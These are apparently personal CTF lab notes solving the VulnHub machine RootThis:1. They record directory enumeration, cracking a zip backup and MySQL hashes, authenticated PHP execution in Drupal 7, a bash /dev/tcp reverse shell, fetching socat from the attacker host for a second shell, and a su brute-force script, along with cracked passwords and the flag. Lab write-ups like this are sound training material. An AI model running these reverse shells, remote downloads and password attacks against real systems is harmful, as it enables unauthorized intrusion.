https://www.vulnhub.com/entry/rootthis-1,272/


---


\[OS]: Debian
\[Web-Technology]: Apache httpd 2.4.25
\[Hostname]:  
\[IP]:  192.168.56.121
\[USERS]:   
\[CREDENTIALS]:  

http://192.168.56.121/drupal - webman::moranguita

---
\[To-Try LIST]:  

**http 80**



---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.25 (Debian)


--- 

\[Web Services Enumeration]:   

**Exploration and Page Source** -> Nothing of interest
```bash

gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30


/manual               (Status: 301) [Size: 317] [--> http://192.168.56.121/manual/]
/backup               (Status: 200) [Size: 270103]
/drupal               (Status: 301) [Size: 317] [--> http://192.168.56.121/drupal/]
/server-status        (Status: 403) [Size: 302]


/manual -> /manual/en/index.html - HTTP Server Documentation
/backup -> Downloads Backup
/drupal -> login page. Page Source -> Drupal 7 


searchsploit drupal 7 #so much - Injection, RCE, AF Upload, XSS


file backup #zip archive

#unzip doesnt work because password protected
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup
PASSWORD FOUND!!!!: pw == thebackup

unzip backup #enter password

cat dump.sql

# Key info in drupal
DB: drupaldb
The picture below is tiny but we have the SQL password hashes and usernames of:
'root','*7AFEAE5774E672996251E09B946CB3953FC67656'
'webman','*9AF2F8E8C08165DC70FA4B4F8D40EA6EC84CB6D2'

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
john --show hashes.txt 
webman:moranguita

Login to Drupal with these 
Drupal allows PHP Code execution - auth rce

#there is even droopescan 
droopescan scan drupal -u $URL/drupal

# find drupal runing with php plugin (module)
# had to enable PHP module in Modules to select it as a text format
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/6666 0>&1'");?>




#Shell successful
```
![[Pasted image 20251102032116.png]]


---


\[OTHER / PRIVILEGE-ESCALATION]:   


```bash

# Step 1 get tty - no python etc.
script /dev/null -c bash

cd /home/user

www-data@RootThis:/home/user$ cat MessageToRoot.txt 
#Hi root,

#Your password for this machine is weak and within the first 300 words of the rockyou.txt wordlist. Fortunately root is not accessible via ssh. Please update the password to a more secure one.

#Regards,
#user

# No exposed SSH port makes it hard to brute force - lucky we got ourselves an interactive shell. 

# On host
head -300 /usr/share/wordlists/rockyou.txt root.pass

#Thought we may need to rev shell back or upload list but we can just copy paste
echo '(contents of root.pass)' > root.pass


# could write a script or use sucrack -

#Connect back to my machine to use that - socat to connect back - must be statically compiled
wget http://192.168.56.101:8000/socat

/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.101:4444


#Script to try su for each password
#!/bin/bash 
file="passwords.txt" 
while read line; do 
	echo "Trying password: $line"; 
	(sleep 0.1; echo $line) | ./socat - EXEC:'su -c id',pty; 
done < $file




root :: 789456123

root@RootThis:~# cat /root/flag.txt
cat /root/flag.txt
Congratulations!

flag: a67d764105005a6a95a9c8c03bc95710bc396dccc4364704127170637b2bd39d



```
![[Pasted image 20251102074716.png]]

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
